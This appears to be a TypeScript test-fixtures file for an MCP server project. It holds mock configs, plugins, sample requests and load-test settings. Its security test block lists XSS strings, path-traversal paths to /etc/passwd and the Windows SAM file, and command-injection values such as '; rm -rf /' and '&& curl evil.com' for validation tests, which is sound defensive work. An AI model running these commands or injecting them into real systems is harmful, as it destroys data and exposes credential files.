/**
 * Test fixtures for universal-mcp-server tests
 */

import type { MCPServerConfig, Plugin, MCPTool, PluginConfig } from '../../src/types/index';

// Mock server configuration for testing
export const mockServerConfig: MCPServerConfig = {
  name: 'Test MCP Server',
  version: '1.0.0',
  description: 'Test server for unit testing',
  transports: {
    websocket: {
      port: 0, // Use random available port for testing
      host: 'localhost',
      maxConnections: 10,
    },
    http: {
      port: 0, // Use random available port for testing
      host: 'localhost',
      cors: true,
    },
  },
  plugins: [
    {
      name: 'test-plugin',
      enabled: true,
      options: { testOption: 'testValue' },
    },
  ],
  logging: {
    level: 'error', // Reduce noise during tests
    format: 'text',
  },
  security: {
    enableRateLimit: false,
    enableInputValidation: true,
    maxRequestSize: 1024 * 1024, // 1MB
  },
};

// Mock plugin for testing
export const mockPlugin: Plugin = {
  name: 'test-plugin',
  version: '1.0.0',
  description: 'A mock plugin for testing',
  tools: [
    {
      name: 'test_tool',
      description: 'A test tool',
      inputSchema: {
        type: 'object',
        properties: {
          input: { type: 'string', description: 'Test input' },
        },
        required: ['input'],
      },
      handler: async (params: Record<string, unknown>) => {
        return { result: `Processed: ${params.input}` };
      },
    },
  ],
  resources: [
    {
      uri: 'test://resource',
      name: 'Test Resource',
      description: 'A test resource',
      mimeType: 'text/plain',
    },
  ],
  initialize: async (config: PluginConfig) => {
    // Mock initialization
  },
  cleanup: async () => {
    // Mock cleanup
  },
};

// Mock plugin with error for testing error scenarios
export const errorPlugin: Plugin = {
  name: 'error-plugin',
  version: '1.0.0',
  description: 'A plugin that throws errors for testing',
  tools: [
    {
      name: 'error_tool',
      description: 'A tool that always throws an error',
      inputSchema: {
        type: 'object',
        properties: {},
      },
      handler: async () => {
        throw new Error('Test error from plugin tool');
      },
    },
  ],
};

// Sample MCP requests for testing
export const sampleRequests = {
  listTools: {
    id: 'test-1',
    method: 'tools/list',
    params: {},
    timestamp: Date.now(),
  },
  callTool: {
    id: 'test-2',
    method: 'tools/call',
    params: {
      name: 'echo',
      arguments: { message: 'Hello, World!' },
    },
    timestamp: Date.now(),
  },
  listResources: {
    id: 'test-3',
    method: 'resources/list',
    params: {},
    timestamp: Date.now(),
  },
  readResource: {
    id: 'test-4',
    method: 'resources/read',
    params: {
      uri: 'test://resource',
    },
    timestamp: Date.now(),
  },
  serverInfo: {
    id: 'test-5',
    method: 'server/info',
    params: {},
    timestamp: Date.now(),
  },
  invalidMethod: {
    id: 'test-6',
    method: 'invalid/method',
    params: {},
    timestamp: Date.now(),
  },
  missingToolName: {
    id: 'test-7',
    method: 'tools/call',
    params: {
      arguments: { message: 'test' },
    },
    timestamp: Date.now(),
  },
  unknownTool: {
    id: 'test-8',
    method: 'tools/call',
    params: {
      name: 'unknown_tool',
      arguments: {},
    },
    timestamp: Date.now(),
  },
};

// Test data for built-in tools
export const toolTestData = {
  echo: {
    valid: { message: 'Test echo message' },
    invalid: {}, // Missing required 'message' field
  },
  listFiles: {
    valid: { path: '.', recursive: false },
    invalid: {}, // Missing required 'path' field
  },
  readFile: {
    valid: { path: './package.json', encoding: 'utf8' },
    invalid: {}, // Missing required 'path' field
  },
  writeFile: {
    valid: { path: './test-file.txt', content: 'Test content' },
    invalid: { path: './test-file.txt' }, // Missing required 'content' field
  },
  executeCommand: {
    valid: { command: 'echo', args: ['test'] },
    invalid: {}, // Missing required 'command' field
  },
  httpRequest: {
    valid: { url: 'https://httpbin.org/get', method: 'GET' },
    invalid: {}, // Missing required 'url' field
  },
  searchFiles: {
    valid: { pattern: '*.js', directory: '.', max_results: 10 },
    invalid: {}, // Missing required 'pattern' field
  },
  createDirectory: {
    valid: { path: './test-dir', recursive: true },
    invalid: {}, // Missing required 'path' field
  },
  deleteFile: {
    valid: { path: './test-file.txt', recursive: false },
    invalid: {}, // Missing required 'path' field
  },
};

// Performance test configurations
export const performanceConfig = {
  lightLoad: {
    concurrentRequests: 10,
    requestsPerSecond: 5,
    duration: 5000, // 5 seconds
  },
  moderateLoad: {
    concurrentRequests: 50,
    requestsPerSecond: 20,
    duration: 10000, // 10 seconds
  },
  heavyLoad: {
    concurrentRequests: 100,
    requestsPerSecond: 50,
    duration: 15000, // 15 seconds
  },
  stressTest: {
    concurrentRequests: 200,
    requestsPerSecond: 100,
    duration: 30000, // 30 seconds
  },
};

// Security test data
export const securityTestData = {
  xssAttempts: [
    '<script>alert("xss")</script>',
    'javascript:alert("xss")',
    '"><script>alert("xss")</script>',
    '\x3Cscript\x3Ealert("xss")\x3C/script\x3E',
  ],
  pathTraversal: [
    '../../../etc/passwd',
    '..\\..\\..\\windows\\system32\\config\\sam',
    '....//....//....//etc/passwd',
    '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
  ],
  commandInjection: ['; rm -rf /', '| cat /etc/passwd', '&& curl evil.com', '`whoami`', '$(id)'],
  largePayloads: [
    'A'.repeat(1024 * 1024), // 1MB
    'A'.repeat(10 * 1024 * 1024), // 10MB
  ],
};

// Error scenarios for testing
export const errorScenarios = {
  networkErrors: ['ECONNREFUSED', 'ETIMEDOUT', 'ENOTFOUND', 'ECONNRESET'],
  fileSystemErrors: [
    'ENOENT', // No such file or directory
    'EACCES', // Permission denied
    'EISDIR', // Is a directory
    'ENOSPC', // No space left on device
  ],
  validationErrors: [
    'Invalid input schema',
    'Missing required parameters',
    'Invalid parameter type',
    'Parameter out of range',
  ],
};

// Test utilities
export const TestUtils = {
  // Create a temporary directory for file tests
  async createTempDir(): Promise<string> {
    const os = await import('os');
    const fs = await import('fs/promises');
    const path = await import('path');

    const tempDir = path.join(os.tmpdir(), `mcp-test-${Date.now()}`);
    await fs.mkdir(tempDir, { recursive: true });
    return tempDir;
  },

  // Clean up temporary directory
  async cleanupTempDir(tempDir: string): Promise<void> {
    const fs = await import('fs/promises');
    try {
      await fs.rm(tempDir, { recursive: true, force: true });
    } catch (error) {
      // Ignore cleanup errors
    }
  },

  // Generate random port for testing
  getRandomPort(): number {
    return Math.floor(Math.random() * 10000) + 30000;
  },

  // Wait for specified time
  async wait(ms: number): Promise<void> {
    return new Promise(resolve => setTimeout(resolve, ms));
  },

  // Create a mock WebSocket connection
  createMockWebSocket() {
    const listeners = new Map();
    return {
      addEventListener: (event: string, callback: Function) => {
        if (!listeners.has(event)) {
          listeners.set(event, []);
        }
        listeners.get(event).push(callback);
      },
      removeEventListener: (event: string, callback: Function) => {
        if (listeners.has(event)) {
          const callbacks = listeners.get(event);
          const index = callbacks.indexOf(callback);
          if (index > -1) {
            callbacks.splice(index, 1);
          }
        }
      },
      emit: (event: string, ...args: any[]) => {
        if (listeners.has(event)) {
          listeners.get(event).forEach((callback: Function) => {
            try {
              callback(...args);
            } catch (error) {
              console.error('Error in event listener:', error);
            }
          });
        }
      },
      close: () => {
        this.emit('close');
      },
      send: (data: string) => {
        // Mock send
      },
      readyState: 1, // OPEN
    };
  },

  // Validate MCP response structure
  validateMCPResponse(response: any): boolean {
    return (
      response &&
      typeof response.id === 'string' &&
      typeof response.timestamp === 'number' &&
      (response.result !== undefined || response.error !== undefined)
    );
  },

  // Validate MCP error structure
  validateMCPError(error: any): boolean {
    return error && typeof error.code === 'number' && typeof error.message === 'string';
  },
};
